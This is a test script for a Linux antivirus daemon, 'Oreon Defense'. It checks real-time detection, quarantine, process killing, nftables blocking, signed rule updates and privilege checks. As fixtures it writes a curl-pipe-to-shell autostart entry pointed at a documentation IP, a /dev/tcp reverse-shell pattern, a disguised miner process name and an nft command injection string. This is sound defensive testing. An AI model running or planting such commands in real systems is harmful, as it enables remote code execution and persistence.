#!/usr/bin/env bash
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"

pick() { for p in "$@"; do [[ -e "$p" ]] && { echo "$p"; return; }; done; echo ""; }
DAEMON="${OREON_DAEMON:-$(pick "$ROOT/build/oreon-defense-daemon" /usr/bin/oreon-defense-daemon)}"
RULES="$(pick "$ROOT/data/rules/starter-rules.yaml" /usr/share/oreon-defense/rules/starter-rules.yaml)"
SAMPLES="$(pick "$ROOT/tests/samples" /usr/share/oreon-defense/samples)"
PUBKEY="$(pick "$ROOT/data/keys/od-rules-ed25519.pub" /usr/share/oreon-defense/keys/od-rules-ed25519.pub)"
FEED="${OREON_FEED_DIR:-$(pick "$ROOT/rules-feed")}"
CLAMDB="${OREON_CLAMAV_DB:-/var/lib/clamav}"

[[ -x "$DAEMON" ]] || { echo "FAIL: no daemon binary (build first or install the package)"; exit 1; }
[[ -f "$RULES" && -f "$SAMPLES/eicar.com" ]] || { echo "FAIL: rules or samples missing"; exit 1; }

if [[ -x "$ROOT/build/test_rules" ]]; then
  echo "== Unit tests =="
  (cd "$ROOT/build" && ctest --output-on-failure)
fi

BASE="$(mktemp -d /tmp/oreon-verify.XXXXXX)"
chmod 755 "$BASE"
mkdir -p "$BASE/data/quarantine" "$BASE/watch" "$BASE/onaccess" "$BASE/bin" "$BASE/feed"
mkdir -p "$BASE/watch/var/tmp/dracut.test/initramfs/usr/bin" \
         "$BASE/watch/home/liveuser/.config/autostart" "$BASE/watch/home/liveuser/.local/bin" \
         "$BASE/watch/drop"
chmod 1777 "$BASE/watch/drop"
SOCK="$BASE/daemon.sock"
PORT=$((20000 + RANDOM % 20000))

FEED_SIGNED_HERE=0
if [[ -n "$FEED" && -f "$FEED/manifest.json" ]]; then
  sha="$(openssl dgst -sha256 -r "$FEED/rules.yaml" | awk '{print $1}')"
  if ! grep -q "\"sha256\": \"$sha\"" "$FEED/manifest.json"; then
    if [[ -f "$ROOT/scripts/sign-rules.sh" ]]; then
      echo "note: rules-feed/rules.yaml is newer than its signature; testing with a throwaway key."
      echo "      Re-sign before publishing: scripts/sign-rules.sh sign KEY rules-feed/rules.yaml rules-feed"
      bash "$ROOT/scripts/sign-rules.sh" keygen "$BASE/tmpkey" >/dev/null
      bash "$ROOT/scripts/sign-rules.sh" sign "$BASE/tmpkey/od-rules-ed25519.key" "$FEED/rules.yaml" "$BASE/feed" >/dev/null
      PUBKEY="$BASE/tmpkey/od-rules-ed25519.pub"
      FEED_SIGNED_HERE=1
    else
      echo "note: rules-feed signature is stale and sign-rules.sh is missing, feed test skipped"
      FEED=""
    fi
  fi
fi

cat > "$BASE/config.json" <<JSON
{
  "dataDir": "$BASE/data",
  "quarantineDir": "$BASE/data/quarantine",
  "socketPath": "$SOCK",
  "logPath": "$BASE/data/events.jsonl",
  "rulesPath": "$RULES",
  "watchPaths": ["$BASE/watch"],
  "exclusions": ["$BASE/data"],
  "onAccessPaths": ["$BASE/onaccess"],
  "onAccessTimeoutMs": 3000,
  "clamavDbDir": "$CLAMDB",
  "rulesUrl": "http://127.0.0.1:$PORT",
  "rulesPublicKey": "$PUBKEY",
  "rulesAutoUpdate": false,
  "ransomShield": true,
  "execProtection": true,
  "persistenceGuard": true,
  "privEscWatch": true,
  "networkBlocking": $( [[ $(id -u) == 0 ]] && echo true || echo false )
}
JSON

HTTP_PID=""
if [[ -n "$FEED" && -f "$FEED/manifest.json" ]]; then
  [[ $FEED_SIGNED_HERE == 1 ]] || cp "$FEED"/manifest.json "$FEED"/rules.yaml "$FEED"/rules.yaml.sig "$BASE/feed/"
  (cd "$BASE/feed" && exec python3 -m http.server "$PORT" --bind 127.0.0.1 >/dev/null 2>&1) &
  HTTP_PID=$!
fi

"$DAEMON" --config "$BASE/config.json" >"$BASE/daemon.log" 2>&1 &
DPID=$!
cleanup() {
  kill "$DPID" 2>/dev/null || true
  wait "$DPID" 2>/dev/null || true
  [[ -n "$HTTP_PID" ]] && kill "$HTTP_PID" 2>/dev/null || true
  find "$HOME" -maxdepth 2 -name .oreon-defense-keepsafe -delete 2>/dev/null || true
  if [[ "${KEEP:-0}" != 1 ]]; then rm -rf "$BASE"; else echo "kept $BASE"; fi
}
trap cleanup EXIT

for _ in $(seq 1 50); do [[ -S "$SOCK" ]] && break; sleep 0.2; done
[[ -S "$SOCK" ]] || { echo "FAIL: daemon socket not ready"; cat "$BASE/daemon.log"; exit 1; }

export BASE SOCK SAMPLES FEED CLAMDB DPID
python3 - <<'PY'
import json, os, shutil, socket, subprocess, sys, time

BASE = os.environ["BASE"]; SOCK = os.environ["SOCK"]; SAMPLES = os.environ["SAMPLES"]
FEED = os.environ.get("FEED", ""); CLAMDB = os.environ["CLAMDB"]
ROOT = os.geteuid() == 0
fails = []

def rpc(method, params=None, timeout=20, preexec=None):
    if preexec:
        code = ("import json,socket,sys;s=socket.socket(socket.AF_UNIX);s.settimeout(20);"
                "s.connect(sys.argv[1]);s.sendall(sys.argv[2].encode());b=b''\n"
                "while True:\n"
                " c=s.recv(65536)\n"
                " if not c: break\n"
                " b+=c\n"
                " if b'\\n' in b:\n"
                "  l=b.split(b'\\n')[0]\n"
                "  if b'\"event\"' not in l: break\n"
                "  b=b.split(b'\\n',1)[1]\n"
                "print(b.split(b'\\n')[0].decode())")
        req = json.dumps({"id": method, "method": method, "params": params or {}}) + "\n"
        out = subprocess.run(preexec + [sys.executable, "-c", code, SOCK, req],
                             capture_output=True, text=True, timeout=30)
        return json.loads(out.stdout.strip().splitlines()[-1])
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect(SOCK)
    s.sendall((json.dumps({"id": method, "method": method, "params": params or {}}) + "\n").encode())
    buf = b""
    while True:
        while b"\n" not in buf:
            c = s.recv(65536)
            if not c:
                return {}
            buf += c
        line, buf = buf.split(b"\n", 1)
        j = json.loads(line)
        if "event" not in j:
            s.close()
            return j

def check(cond, what):
    print(("ok:   " if cond else "FAIL: ") + what)
    if not cond:
        fails.append(what)

def wait(pred, secs):
    end = time.time() + secs
    while time.time() < end:
        r = pred()
        if r:
            return r
        time.sleep(0.25)
    return None

st = rpc("getStatus")
check(st.get("ok"), "getStatus answers")
res = st.get("result", {})
for k in ("clamav", "onAccess", "processMonitor", "networkBlocking", "rules"):
    check(k in res, "status has " + k)

have_db = any(os.path.exists(os.path.join(CLAMDB, f)) for f in ("main.cvd", "main.cld", "daily.cvd", "daily.cld"))
if have_db:
    ok = wait(lambda: rpc("getStatus")["result"]["clamav"]["available"], 90)
    check(bool(ok), "ClamAV database loaded")
else:
    c = rpc("getStatus")["result"]["clamav"]
    check(not c["available"] and c["error"], "missing ClamAV database is reported: " + c.get("error", ""))

target = os.path.join(BASE, "watch", "eicar-drop.com")
shutil.copyfile(os.path.join(SAMPLES, "eicar.com"), target)
def dropped():
    th = rpc("getThreats")["result"]["threats"]
    return [t for t in th if t["path"] == target and t["action"] == 1]
hit = wait(dropped, 15)
check(bool(hit), "real-time EICAR drop quarantined")
if hit and have_db:
    check(hit[0]["engine"] == "clamav", "EICAR found by ClamAV (" + hit[0]["name"] + ")")
check(not os.path.exists(target), "dropped file moved away")

if hit:
    qid = hit[0].get("quarantineId")
    before = [i for i in rpc("getQuarantine")["result"]["items"] if i["id"] == qid]
    check(bool(before), "quarantined item is listed")
    rdel = rpc("deleteQuarantine", {"id": qid})
    check(rdel.get("ok"), "quarantine delete works with no password")
    after = [i for i in rpc("getQuarantine")["result"]["items"] if i["id"] == qid]
    check(not after, "deleted item removed from the list")

W = os.path.join(BASE, "watch")
quiet, loud = [], []
for n in ("cat", "systemctl", "systemd-cgls"):
    src = "/usr/bin/" + n
    if os.path.exists(src):
        dst = os.path.join(W, "var/tmp/dracut.test/initramfs/usr/bin", n)
        shutil.copyfile(src, dst)
        os.chmod(dst, 0o755)
        quiet.append(dst)
AS = os.path.join(W, "home/liveuser/.config/autostart")
def desktop(name, exec_line, extra=""):
    p = os.path.join(AS, name)
    with open(p, "w") as f:
        f.write("[Desktop Entry]\nType=Application\nName=%s\n%sExec=%s\n" % (name, extra, exec_line))
    return p
quiet.append(desktop("org.kde.discover.notifier.desktop", "/usr/libexec/DiscoverNotifier",
                     "Icon=plasmadiscover\nX-KDE-autostart-phase=2\nOnlyShowIn=KDE;\n"))
quiet.append(desktop("org.kde.sleeper.desktop", "/usr/bin/sleep 5"))
time.sleep(1)
elf = os.path.join(W, "drop", "payload")
with open(elf, "wb") as f:
    f.write(open("/usr/bin/true", "rb").read() + os.urandom(64))
os.chmod(elf, 0o755)
loud.append(elf)
loud.append(desktop("updater.desktop", 'sh -c "curl -s http://198.51.100.7/i | sh"'))
loud.append(desktop("helper.desktop", "~/.local/bin/x"))
def by_path():
    return {t["path"]: t for t in rpc("getThreats")["result"]["threats"]}
seen = wait(lambda: (lambda m: m if all(p in m for p in loud) else None)(by_path()), 20) or by_path()
for p in loud:
    t = seen.get(p)
    check(t is not None, "suspicious item reported: " + os.path.basename(p))
    if t:
        check(t.get("heuristic") and t["severity"] == "low" and t["action"] == 0,
              "  reported as low confidence, not moved (%s, %s)" % (t["severity"], t["ruleId"]))
    check(os.path.exists(p), "  file left in place: " + os.path.basename(p))
time.sleep(1)
seen = by_path()
for p in quiet:
    check(p not in seen, "not flagged: " + p.replace(W, "watch"))
check(rpc("getStatus")["result"]["statusText"] != "At risk", "low confidence hits do not mark the system at risk")

scan_dir = os.path.join(BASE, "scan")
os.makedirs(scan_dir)
shutil.copyfile(os.path.join(SAMPLES, "oreon_demo_malware.sh"), os.path.join(scan_dir, "oreon_demo_malware.sh"))
shutil.copyfile(os.path.join(SAMPLES, "eicar.com"), os.path.join(scan_dir, "eicar.com"))
r = rpc("startScan", {"type": "custom", "paths": [scan_dir]})
check(r.get("ok"), "custom scan starts")
p = wait(lambda: (lambda x: x if not x.get("running", True) else None)(rpc("getScanProgress")["result"]), 60)
check(p is not None and p["threatsFound"] >= 2, "custom scan found both samples")
th = rpc("getThreats")["result"]["threats"]
check(any(t["ruleId"] == "oreon-demo-malware" for t in th), "YAML rule layer still active")

import tempfile
vt = tempfile.mkdtemp(prefix="dracut.test.", dir="/var/tmp")
try:
    os.makedirs(os.path.join(vt, "initramfs/usr/bin"))
    for n in ("cat", "systemctl", "systemd-cgls"):
        if os.path.exists("/usr/bin/" + n):
            shutil.copy2("/usr/bin/" + n, os.path.join(vt, "initramfs/usr/bin", n))
    r = rpc("startScan", {"type": "custom", "paths": [vt]})
    p = wait(lambda: (lambda x: x if (r.get("ok") and not x.get("running", True)) else None)(rpc("getScanProgress")["result"]), 60)
    check(p is not None and p["filesScanned"] >= 1 and p["threatsFound"] == 0,
          "scan of /var/tmp/dracut.test.* finds nothing (%s files)" % (p or {}).get("filesScanned"))
finally:
    shutil.rmtree(vt, ignore_errors=True)

name = bytes([120, 109, 114, 105, 103]).decode()
fake = os.path.join(BASE, "bin", name)
shutil.copyfile(shutil.which("sleep"), fake)
os.chmod(fake, 0o755)
proc = subprocess.Popen([fake, "30"])
dead = wait(lambda: proc.poll() is not None, 10)
check(bool(dead), "malicious process killed (mode " + rpc("getStatus")["result"]["processMonitor"]["mode"] + ")")
if not dead:
    proc.kill()

if shutil.which("bash"):
    rsh = subprocess.Popen(["bash", "-c", "TARGET=/dev/tcp/127.0.0.1/4444; while :; do sleep 1; done"])
    rdead = wait(lambda: rsh.poll() is not None, 15)
    check(bool(rdead), "reverse shell pattern (/dev/tcp) stopped")
    if not rdead:
        rsh.kill()

check(not rpc("startScan", {"type": "custom", "paths": ["relative"]}).get("ok"), "relative scan path rejected")
check(not rpc("getHistory", {"limit": "x"}).get("ok"), "wrong param type rejected")
check(not rpc("blockIp", {"ip": "127.0.0.1"}).get("ok"), "loopback block rejected")
check(not rpc("blockIp", {"ip": "1.2.3.4; flush ruleset"}).get("ok"), "nft injection rejected")
check(rpc("nope").get("error") == "unknown method", "unknown method rejected")

if FEED:
    man = json.load(open(os.path.join(BASE, "feed", "manifest.json")))
    r = rpc("updateRules", {})
    check(r.get("ok"), "rule update starts")
    rs = wait(lambda: (lambda x: x if (x["lastCheck"] and not x["running"]) else None)(rpc("getStatus")["result"]["rules"]), 30)
    check(rs is not None and rs["version"] == man["version"], "feed version %s applied" % man["version"])
    y = open(os.path.join(BASE, "feed", "rules.yaml")).read()
    y = y.replace("version: %d" % man["version"], "version: %d" % (man["version"] + 1), 1)
    open(os.path.join(BASE, "feed", "rules.yaml"), "w").write(y)
    man["version"] += 1
    import hashlib
    man["sha256"] = hashlib.sha256(y.encode()).hexdigest()
    json.dump(man, open(os.path.join(BASE, "feed", "manifest.json"), "w"))
    last = rs["lastCheck"] if rs else 0
    time.sleep(1.1)
    rpc("updateRules", {})
    rs2 = wait(lambda: (lambda x: x if (x["lastCheck"] > last and not x["running"]) else None)(rpc("getStatus")["result"]["rules"]), 30)
    check(rs2 is not None and "signature" in rs2["lastError"], "tampered feed refused: " + (rs2 or {}).get("lastError", ""))
    check(rs2 is not None and rs2["version"] == man["version"] - 1, "last good rules kept")
else:
    print("skip: no rules-feed folder, feed test skipped")

if ROOT:
    st = rpc("getStatus")["result"]
    oa = st["onAccess"]
    if oa["mode"] == "fanotify":
        f = os.path.join(BASE, "onaccess", "eicar-open.txt")
        open(f, "w").write(open(os.path.join(SAMPLES, "eicar.com")).read())
        r = subprocess.run(["cat", f], capture_output=True, text=True)
        check(r.returncode != 0 and "not permitted" in r.stderr.lower(), "fanotify blocked opening EICAR")
        q = wait(lambda: [i for i in rpc("getQuarantine")["result"]["items"] if i["originalPath"] == f], 10)
        check(bool(q), "blocked file quarantined")
        d = os.path.join(BASE, "onaccess", "dracut.x", "initramfs", "usr", "bin")
        os.makedirs(d)
        c = os.path.join(d, "systemctl")
        shutil.copy2("/usr/bin/cat", c)
        r = subprocess.run(["head", "-c", "4", c], capture_output=True)
        check(r.returncode == 0, "fanotify allows opening a dracut style copy")
        drop = os.path.join(BASE, "onaccess", "drop")
        os.makedirs(drop)
        os.chmod(drop, 0o1777)
        u = os.path.join(drop, "payload")
        with open(u, "wb") as fh:
            fh.write(open("/usr/bin/true", "rb").read() + os.urandom(64))
        os.chmod(u, 0o755)
        r = subprocess.run(["head", "-c", "4", u], capture_output=True)
        check(r.returncode == 0, "fanotify does not block a low confidence hit")
        h = wait(lambda: [t for t in rpc("getThreats")["result"]["threats"] if t["path"] == u], 10)
        check(bool(h) and h[0].get("heuristic") and h[0]["severity"] == "low",
              "on-access ELF drop reported as low confidence")
        check(not [t for t in rpc("getThreats")["result"]["threats"] if t["path"] == c],
              "on-access dracut style copy not reported")
    else:
        print("skip: fanotify not available here: " + oa.get("error", ""))
    nb = st["networkBlocking"]
    if nb["active"]:
        r = rpc("blockIp", {"ip": "203.0.113.77", "reason": "verify"})
        check(r.get("ok"), "blockIp as root")
        out = subprocess.run(["nft", "list", "set", "inet", "oreon_defense", "blocklist4"], capture_output=True, text=True).stdout
        check("203.0.113.77" in out, "address present in nftables set")
        r = rpc("unblockIp", {"ip": "203.0.113.77"})
        check(r.get("ok"), "unblockIp as root")
    else:
        print("skip: nftables not active: " + nb.get("error", ""))
    nobody = ["setpriv", "--reuid=65534", "--regid=65534", "--clear-groups"]
    if shutil.which("setpriv"):
        r = rpc("whoami", preexec=nobody)
        check(r.get("ok") and not r["result"]["privileged"], "nobody is not privileged")
        for m, p in (("setOptions", {"killMalicious": False}), ("unblockIp", {"ip": "203.0.113.77"}),
                     ("restore", {"id": "x"}),
                     ("setProtection", {"fileRealtime": False}), ("setConfig", {"scheduleType": "none"})):
            r = rpc(m, p, preexec=nobody)
            check(not r.get("ok") and r.get("code") == "EPERM", "nobody refused: " + m)
        r = rpc("getStatus", preexec=nobody)
        check(r.get("ok"), "nobody may read status")

if fails:
    print("\n%d check(s) failed" % len(fails))
    sys.exit(1)
print("\nlive checks ok")
PY

if [[ $(id -u) == 0 ]]; then
  kill "$DPID"; wait "$DPID" 2>/dev/null || true
  if nft list table inet oreon_defense >/dev/null 2>&1; then
    if ! pgrep -x oreon-defense-d >/dev/null; then echo "FAIL: nft table left behind"; exit 1; fi
  else
    echo "ok:   nft table removed on stop"
  fi
fi
echo "verify_detection: ok"
